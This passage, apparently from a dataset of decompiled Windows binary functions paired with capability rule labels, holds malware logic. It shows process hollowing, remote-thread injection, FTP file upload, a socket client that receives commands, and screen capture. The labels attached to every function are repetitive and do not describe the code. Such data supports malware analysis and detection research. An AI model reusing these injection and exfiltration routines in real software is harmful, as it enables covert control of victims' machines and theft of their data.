fcn.0040305c();\n            if (cVar1 != '\\0') break;\n            uStack560 = 0x472c59;\n            fcn.00403cc4();\n            uStack560 = 0x472c64;\n            fcn.00403d30();\n            uStack560 = 0x472c69;\n            fcn.0040305c();\n            uStack560 = var_8h;\n            uStack556 = 0x472d64;\n            fcn.004058e0(uVar2, var_ch);\n        }\n        uStack560 = 0x472ca0;\n        fcn.00403918();\n        uStack560 = 0x472ca5;\n        fcn.0040305c();\n    }\n    uStack560 = 0x472cb0;\n    fcn.00405818();\n    uStack560 = 0x472cbb;\n    fcn.00403500();\n    uStack560 = 0x472cc0;\n    fcn.0040305c();\n    uStack560 = 0x472cce;\n    fcn.00405cd0();\n    uStack560 = 0x472cd3;\n    fcn.004040ac();\n    uStack560 = 0x472cd8;\n    fcn.0040305c();\n    uStack560 = 0x472ce3;\n    fcn.00403918();\n    uStack560 = 0x472ce8;\n    fcn.0040305c();\n    *in_FS_OFFSET = uStack556;\n    *in_FS_OFFSET = arg_ch;\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1064
    },
    "00472d8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00472d8c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY528;\n    uint uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint uStack508;\n    uint uStack504;\n    uchar *puStack500;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack500 = &stack0xfffffffc;\n    puStack512 = &stack0xfffffffc;\n    uStack504 = 0x472f03;\n    uStack508 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe04;\n    uStack516 = 0x472ec7;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    fcn.00405530();\n    fcn.00471ae4();\n    fcn.00405818();\n    fcn.00403770();\n    fcn.00471ae4(0x80);\n    fcn.00405818();\n    uStackY528 = fcn.004059dc();\n    sub.kernel32.dll_SetFileAttributesA();\n    fcn.004034f4();\n    fcn.0040305c();\n    while( true ) {\n        fcn.00403abc();\n        cVar1 = fcn.0040305c();\n        if (cVar1 != '\\0') break;\n        fcn.00403cc4();\n        fcn.00403d30();\n        fcn.0040305c();\n        uStackY528 = 0x472f38;\n        fcn.004058e0();\n    }\n    fcn.00403918();\n    fcn.0040305c();\n    fcn.00409b84();\n    fcn.004055c8();\n    fcn.00405584();\n    *in_FS_OFFSET = uStackY528;\n    *in_FS_OFFSET = uStack516;\n    uStack508 = 0x472f0a;\n    puStack512 = 0x472ef5;\n    fcn.00405554();\n    puStack512 = 0x472f02;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 519
    },
    "00473474": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473474(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x47348c;\n    fcn.004059cc();\n    puStack24 = 0x473494;\n    fcn.004059cc();\n    puStack24 = 0x47349c;\n    fcn.004059cc();\n    puStack24 = 0x4734a4;\n    fcn.004059cc();\n    uStack28 = 0x47354e;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    *0x49b190 = sub.wininet.dll_InternetOpenA(0x473560, 0, 0, 0, 0);\n    if (*0x49b190 != 0) {\n        uVar1 = fcn.004059dc(1, 0, 0);\n        uVar1 = fcn.004059dc(uVar1);\n        uVar1 = fcn.00409ee4(uVar1);\n        uVar1 = fcn.004059dc(uVar1);\n        in_stack_ffffffac = *0x49b190;\n        *0x49b18c = sub.wininet.dll_InternetConnectA(*0x49b190, uVar1);\n        if (*0x49b18c != 0) {\n            *0x49522c = 1;\n            goto code_r0x0047352b;\n        }\n    }\n    *0x49522c = 0;\ncode_r0x0047352b:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405554(0x473555);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 461
    },
    "00473568": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473568(void)\n\n{\n    if (*0x49522c != '\\0') {\n        sub.wininet.dll_InternetCloseHandle(*0x49b190);\n        sub.wininet.dll_InternetCloseHandle(*0x49b18c);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00473588": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473588(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x47359d;\n    fcn.004059cc();\n    puStack20 = 0x4735a5;\n    fcn.004059cc();\n    uStack24 = 0x473600;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x49522c != '\\0') {\n        puStack20 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(2, 0);\n        uVar1 = fcn.004059dc(uVar1);\n        in_stack_ffffffd0 = *0x49b18c;\n        sub.wininet.dll_FtpPutFileA(*0x49b18c, uVar1);\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405554(0x473607);\n    return;\n}\n",
        "token_count": 279
    },
    "00473de4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00473de4(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    if (*(arg_ch + 0xa4) != 0) {\n        for (var_ch = *(arg_ch + 0xa0) + arg_8h; *var_ch != 0; var_ch = var_ch[1] + var_ch) {\n            iVar1 = *var_ch;\n            piVar4 = var_ch + 2;\n            iVar2 = fcn.0040345c();\n            do {\n                if (*piVar4 >> 0xc == 3) {\n                    piVar3 = iVar1 + arg_8h + (*piVar4 & 0xfff);\n                    *piVar3 = *piVar3 + arg_10h;\n                }\n                piVar4 = piVar4 + 2;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "00473f28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473f28(void)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0xd0, 0x1000, 4);\n    *in_EAX = uVar1;\n    uVar1 = *in_EAX;\n    if (*in_EAX != 0) {\n        for (; (uVar1 & 3) != 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00473f5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00473f5c(int16_t *param_1, uchar *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    uchar *in_stack_ffffff60;\n    int32_t iStack144;\n    uint *puStack140;\n    uchar *puStack136;\n    uint *var_74h;\n    uchar *puStack116;\n    int32_t iStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint *puStack100;\n    uchar *hProcess;\n    int32_t hThread;\n    uint lpNumberOfBytesWritten;\n    int32_t lpBaseAddress;\n    int32_t lpBuffer;\n    uchar *lpAddress;\n    uint *lpContext;\n    int32_t var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    puStack136 = 0x473f75;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack136 = 0x473f7d;\n    fcn.004059cc();\n    puStack140 = 0x4741c4;\n    iStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    puStack136 = &stack0xfffffffc;\n    if (var_8h != NULL) {\n        in_stack_ffffff60 = var_8h;\n        puStack136 = &stack0xfffffffc;\n        fcn.004058e0(var_8h, 0x4741ec, var_4h, 0x4741e0);\n    }\n    var_ch = 0;\n    if ((*param_1 == 0x5a4d) && (arg_ch = param_1 + *(param_1 + 0x1e),  *arg_ch == 0x4550)) {\n        fcn.00403af4();\n        fcn.00403af4();\n        var_74h = 0x44;\n        puVar3 = &fcn.00473f5c::var_74h;\n        uVar1 = fcn.004059dc(0, 0, 0, 4, 0, 0, puVar3, &fcn.00473f5c::hProcess);\n        uVar1 = fcn.004059dc(uVar1);\n        iVar2 = sub.kernel32.dll_CreateProcessA(uVar1);\n        if (iVar2 != 0) {\n            lpContext = fcn.00473f28();\n            if (lpContext != NULL) {\n                *lpContext = 0x10007;\n                iVar2 = sub.kernel32.dll_GetThreadContext(hThread, lpContext);\n                if (iVar2 != 0) {\n                    sub.kernel32.dll_ReadProcessMemory\n                              (hProcess, lpContext[0x29] + 8, &fcn.00473f5c::lpBuffer, 4, \n                               &fcn.00473f5c::lpNumberOfBytesWritten);\n                    if (arg_ch[0xd] == lpBuffer) {\n                        iVar2 = sub.ntdll_NtUnmapViewOfSection(hProcess, arg_ch[0xd]);\n                        if (iVar2 == 0) {\n                            lpBaseAddress =\n                                 sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                        }\n                        else {\n                            lpBaseAddress = sub.kernel32.dll_VirtualAllocEx(hProcess, 0, arg_ch[0x14], 0x3000, 0x40);\n                        }\n                    }\n                    else {\n                        lpBaseAddress =\n                             sub.kernel32.dll_VirtualAllocEx(hProcess, arg_ch[0xd], arg_ch[0x14], 0x3000, 0x40);\n                    }\n                    if (lpBaseAddress != 0) {\n                        uStack108 = fcn.00473e9c();\n                        if (arg_ch[0xd] != lpBaseAddress) {\n                            fcn.00473de4(uStack108, arg_ch, lpBaseAddress - arg_ch[0xd]);\n                            arg_ch[0xd] = lpBaseAddress;\n                            fcn.00408568();\n                        }\n                        puStack100 = &fcn.00473f5c::lpNumberOfBytesWritten;\n                        iStack104 = arg_ch[0x14];\n                        iStack112 = lpBaseAddress;\n                        puStack116 = hProcess;\n                        var_74h = 0x47413d;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        var_74h = &fcn.00473f5c::lpNumberOfBytesWritten;\n                        puStack136 = hProcess;\n                        puStack140 = 0x47415d;\n                        sub.kernel32.dll_WriteProcessMemory();\n                        lpContext[0x2c] = arg_ch[10] + lpBaseAddress;\n                        puStack140 = lpContext;\n                        iStack144 = hThread;\n                        sub.kernel32.dll_SetThreadContext();\n                        sub.kernel32.dll_ResumeThread(hThread);\n                        var_ch = hThread;\n                    }\n                }\n                sub.kernel32.dll_VirtualFree_1(lpAddress, 0, 0x8000);\n                in_stack_ffffff60 = lpAddress;\n            }\n            if (var_ch == 0) {\n                sub.kernel32.dll_TerminateProcess(puVar3, 0);\n                in_stack_ffffff60 = hProcess;\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405554(0x4741cb);\n    return;\n}\n",
        "token_count": 1253
    },
    "00474230": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00474230(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    *0x49b1b0 = sub.kernel32.dll_LoadLibraryA(0x4742dc);\n    if (*0x49b1b0 != 0) {\n        *0x49b19c = sub.kernel32.dll_GetProcAddress_1(*0x49b1b0, 0x4742e8);\n        if (*0x49b19c != 0) {\n            *0x49b1a0 = sub.kernel32.dll_GetProcAddress_1(*0x49b1b0, 0x4742f8);\n            if (*0x49b1a0 != 0) {\n                *0x49b1a4 = sub.kernel32.dll_GetProcAddress_1(*0x49b1b0, 0x474308);\n                if (*0x49b1a4 != 0) {\n                    *0x49b1a8 = sub.kernel32.dll_GetProcAddress_1(*0x49b1b0, 0x47431c);\n                    if (*0x49b1a8 != 0) {\n                        *0x49b1ac = sub.kernel32.dll_GetProcAddress_1(*0x49b1b0, 0x474330);\n                        if (*0x49b1ac != 0) {\n                            uVar1 = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 333
    },
    "0047434c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047434c(void)\n\n{\n    if (*0x49b1b0 != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x49b1b0);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "00474e48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00474e48(uint arg_8h, uint nSize)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint lpNumberOfBytesRead;\n    uint lpBuffer;\n    \n    fcn.00474e18();\n    fcn.00474d5c();\n    fcn.00474e18();\n    uVar1 = sub.kernel32.dll_CreateRemoteThread();\n    if (arg_8h != '\\0') {\n        sub.kernel32.dll_WaitForSingleObject(uVar1, 0xffffffff);\n        sub.kernel32.dll_ReadProcessMemory();\n    }\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "0047f038": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047f038(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x47f082;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49b1b4 = *0x49b1b4 + 1;\n    if (*0x49b1b4 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4957fc == 0) {\n            sub.wsock32.dll_WSACleanup();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (**0x495808 != 0) {\n            fcn.0040f94c();\n        }\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 221
    },
    "0047f4a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047f4a4(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint uVar8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47f6fb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_2 != NULL) {\n        puStack40 = 0x47f4d5;\n        iVar6 = (***param_2)();\n        if (iVar6 >> 0x20 == 0) {\n            if (iVar6 != 0) {\ncode_r0x0047f4ea:\n                puStack40 = 0x47f4f5;\n                fcn.004055c8();\n                puStack40 = 0x47f507;\n                fcn.00405a84();\n                puStack40 = 0x47f513;\n                puVar1 = fcn.00404620();\n                uVar5 = 1;\n                uStack44 = 0x47f6de;\n                uStack48 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd0;\n                puStack40 = &stack0xfffffffc;\n                fcn.0041b750(0, 0);\n                fcn.0041be60();\n                fcn.004677d8();\n                uVar8 = 0;\n                fcn.0041b750(0, 0);\n                fcn.00405974();\n                if (uVar5) {\n                    uVar7 = (***puVar1)();\n                    uVar8 = uVar7;\n                    iVar2 = fcn.00465994(uVar7);\n                    **0x495cd0 = iVar2;\n                    uVar5 = **0x495cd0 == 0;\n                    if (!uVar5) {\n                        pcVar3 = fcn.00465d80();\n                        **0x495b20 = pcVar3;\n                        uVar5 = pcVar3 == NULL;\n                        if (!uVar5) {\n                            uVar4 = fcn.004059dc(**0x495b34);\n                            (***0x495b20)(*(in_EAX + 0x48), **0x4959d8, uVar4);\n                        }\n                    }\n                }\n                fcn.00405974();\n                if (uVar5) {\n                    uVar7 = (***puVar1)();\n                    uVar8 = uVar7;\n                    iVar2 = fcn.00465994(uVar7);\n                    **0x495cd0 = iVar2;\n                    if (**0x495cd0 != 0) {\n                        pcVar3 = fcn.00465d80();\n                        **0x495bf8 = pcVar3;\n                        uVar4 = fcn.00465d80();\n                        **0x495c88 = uVar4;\n                        uVar4 = fcn.00465d80();\n                        **0x495c58 = uVar4;\n                        uVar4 = fcn.00465d80();\n                        **0x495ca4 = uVar4;\n                        uVar4 = fcn.00465d80();\n                        **0x495978 = uVar4;\n                        if (**0x495bf8 != NULL) {\n                            uVar4 = fcn.004059dc();\n                            (***0x495bf8)(**0x495af4, uVar4);\n                        }\n                    }\n                }\n                *in_FS_OFFSET = uVar8;\n                uVar8 = 0x47f6e5;\n                if (puVar1 != NULL) {\n                    fcn.0040f94c(0x47f6e5);\n                }\n                if (param_2 != NULL) {\n                    fcn.0040f94c(uVar8);\n                }\n                return;\n            }\n        }\n        else if (0xffffffff < iVar6) goto code_r0x0047f4ea;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47f702;\n    uStack32 = 0x47f6fa;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1029
    },
    "0047f7b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047f7b0(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    uint32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStackY160;\n    uint uStackY156;\n    int32_t iStack64;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uchar auStack24 [3];\n    int32_t *var_11h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar2 = 0x433;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    uStack32 = 0x47fc00;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    bVar1 = false;\n    uVar3 = 1;\n    _auStack24 = unaff_EDI;\n    unique0x10000308 = unaff_ESI;\n    var_ch = in_EAX;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        _auStack24 = CONCAT13(1, auStack24);\n    }\n    else {\n        _auStack24 = _auStack24 & 0xffffff;\n    }\n    var_4h = sub.wsock32.dll_socket();\n    if (var_4h != -1) {\n        sub.wsock32.dll_htons();\n        iVar2 = sub.wsock32.dll_inet_addr();\n        if (iVar2 == -1) {\n            iStack64 = **0x495b34;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x0047fb9f;\n        }\n        sub.wsock32.dll_connect();\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            fcn.00409d78();\n            fcn.004058e0();\n            fcn.00475e38();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                fcn.00403af4();\n                sub.wsock32.dll_recv();\n                fcn.00405e3c();\n                fcn.00409bd8();\n                fcn.004057d4();\n                iVar2 = fcn.00409ee4();\n                *(var_ch + 0x50) = iVar2;\n                *(var_ch + 0x54) = iVar2 >> 0x1f;\n                uStackY156 = 0x47f98c;\n                fcn.0047f790(&stack0xfffffffc);\n                if (var_11h == '\\0') {\n                    uStackY156 = 0x47fa19;\n                    iStackY160 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff60;\n                    fcn.0040a694();\n                    fcn.0048b61c();\n                    fcn.00405864();\n                    fcn.00403770();\n                    **0x495bd8 = 1;\n                    fcn.00403e84();\n                    fcn.0040305c();\n                    bVar1 = true;\n                    *in_FS_OFFSET = iStackY160;\n                    while (*(var_ch + 0xd) == '\\0') {\n                        fcn.00403af4();\n                        iVar2 = sub.wsock32.dll_recv();\n                        uVar3 = iVar2 == 0;\n                        if (iVar2 < 1) break;\n                        fcn.00405e3c();\n                        fcn.00409bd8();\n                        fcn.004057d4();\n                        fcn.00405a44();\n                        fcn.00405974();\n                        if (uVar3) break;\n                        fcn.004038f8(0);\n                        fcn.0040305c();\n                        fcn.0047f790(&stack0xfffffffc);\n                    }\n                }\n                else {\n                    *NULL = fcn.00404620();\n                    while (*(var_ch + 0xd) == '\\0') {\n                        fcn.00403af4();\n                        iVar2 = sub.wsock32.dll_recv();\n                        if (iVar2 < 1) break;\n                        (**(*stack0xffffffec + 0x10))();\n                        fcn.0047f790(&stack0xfffffffc);\n                    }\n                }\n            }\n        }\n        if (var_11h == '\\0') {\n            if (bVar1) {\n                fcn.00403918();\n                fcn.0040305c();\n            }\n            fcn.0047f10c();\n        }\n        else {\n            fcn.0047f4a4();\n        }\n        sub.wsock32.dll_shutdown();\n        iStack64 = var_4h;\n        sub.wsock32.dll_closesocket();\n        fcn.0041fec4();\n    }\ncode_r0x0047fb9f:\n    *in_FS_OFFSET = iStack64;\n    fcn.00405530();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1246
    },
    "0047fd5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047fd5c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    ushort uStackY8240;\n    ushort uStackY8238;\n    int32_t iStackY8236;\n    uchar auStackY8224 [3836];\n    uint uStackY4388;\n    uint uStackY4384;\n    uint uStackY4380;\n    uint uStackY4376;\n    uint uStackY4372;\n    int32_t iStack4252;\n    uint uStack4248;\n    uchar *puStack4244;\n    uchar *puStack4236;\n    uint uStack4232;\n    uint uStack4228;\n    uchar *puStack4220;\n    uint uStack4216;\n    uint uStack4212;\n    int32_t iStack4208;\n    uchar *puStack4204;\n    uint uStack4200;\n    int32_t iStack4196;\n    int32_t iStack4192;\n    uint32_t uStack4188;\n    uint uStack4184;\n    uint uStack4180;\n    uint uStack4176;\n    int32_t iStack4172;\n    uint uStack4168;\n    uchar *puStack4164;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack4164 = &stack0xfffffffc;\n    iVar2 = 2;\n    do {\n        iVar1 = iVar2;\n        iVar2 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack4168 = 0x480050;\n    iStack4172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb4;\n    uStack4176 = 0;\n    uStack4180 = 1;\n    uStack4184 = 2;\n    uStack4188 = 0x47fda0;\n    var_4h = iVar1;\n    var_4h = sub.wsock32.dll_socket();\n    if (var_4h != -1) {\n        uStackY8240 = 2;\n        uStack4188 = **0x4959d8;\n        iStack4192 = 0x47fdc4;\n        uStackY8238 = sub.wsock32.dll_htons();\n        iStack4192 = **0x495b34;\n        iStack4196 = 0x47fdd8;\n        iStackY8236 = sub.wsock32.dll_inet_addr();\n        if (iStackY8236 == -1) {\n            iStack4196 = **0x495b34;\n            uStack4200 = 0x47fdf0;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x00480002;\n            iStackY8236 = ***(iVar2 + 0xc);\n        }\n        uStack4200 = 0x10;\n        puStack4204 = &stack0xffffdfd0;\n        iStack4208 = var_4h;\n        uStack4212 = 0x47fe17;\n        sub.wsock32.dll_connect();\n        uStack4212 = 0;\n        uStack4216 = 0x2000;\n        puStack4220 = &stack0xffffdfe0;\n        iStack4196 = var_4h;\n        uStack4228 = 0x47fe2e;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            uStack4228 = 0x47fe43;\n            fcn.00409d78();\n            uStack4228 = 0x47fe59;\n            fcn.00405864();\n            uStack4228 = 0x47fe67;\n            fcn.00475e38();\n            uStack4228 = 0;\n            uStack4232 = 0x2000;\n            puStack4236 = &stack0xffffdfe0;\n            iStack4196 = var_4h;\n            puStack4244 = 0x47fe7e;\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                puStack4244 = 0x47fe91;\n                var_8h = fcn.00404620();\n                puStack4244 = 0x47fea0;\n                piVar3 = fcn.00404620();\n                uStack4248 = 0x47fffb;\n                iStack4252 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffef64;\n                puStack4244 = &stack0xfffffffc;\n                uVar4 = sub.user32.dll_GetDC();\n                uVar5 = sub.gdi32.dll_CreateCompatibleDC();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_GetDeviceCaps();\n                uVar6 = sub.gdi32.dll_CreateCompatibleBitmap();\n                sub.gdi32.dll_SelectObject();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_BitBlt();\n                fcn.0045ff18(&fcn.0047fd5c::var_8h);\n                fcn.0041b750(0, 0);\n                fcn.004676a0();\n                iVar2 = 0;\n                uStackY4372 = 0x47ff64;\n                fcn.0041b750(0, 0);\n                while( true ) {\n                  